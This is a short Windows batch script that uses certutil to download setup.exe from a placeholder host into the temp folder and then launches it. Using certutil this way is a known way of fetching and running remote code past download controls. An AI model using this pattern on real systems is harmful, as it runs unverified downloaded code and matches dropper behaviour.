@echo off
certutil -urlcache -split -f https://downloads.example.com/setup.exe %TEMP%\setup.exe
start "" %TEMP%\setup.exe
